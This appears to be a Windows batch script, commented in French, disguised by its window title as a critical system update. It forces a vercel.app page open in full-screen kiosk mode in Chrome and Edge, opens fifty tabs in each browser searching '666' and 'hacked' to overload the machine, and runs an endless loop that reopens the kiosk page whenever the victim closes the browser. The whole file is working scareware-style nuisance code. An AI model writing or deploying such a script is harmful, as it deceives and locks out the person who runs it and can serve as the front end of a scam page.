@echo off
title MISE A JOUR SYSTEME CRITIQUE
color 0a

:: Ouvre la page en plein écran avec Chrome et Edge
start chrome --kiosk "https://member-cleanup.vercel.app"
start msedge --kiosk "https://member-cleanup.vercel.app"

:: Ouvre 50 onglets pour saturer (ça va ramer)
for /l %%x in (1, 1, 50) do (
    start chrome "https://www.google.com/search?q=666"
    start msedge "https://www.google.com/search?q=hacked"
)

:: Boucle infinie pour relancer si jamais il ferme le navigateur
:loop
timeout /t 2 >nul
tasklist | find /i "chrome.exe" >nul
if errorlevel 1 (
    start chrome --kiosk "https://member-cleanup.vercel.app"
)
tasklist | find /i "msedge.exe" >nul
if errorlevel 1 (
    start msedge --kiosk "https://member-cleanup.vercel.app"
)
goto loop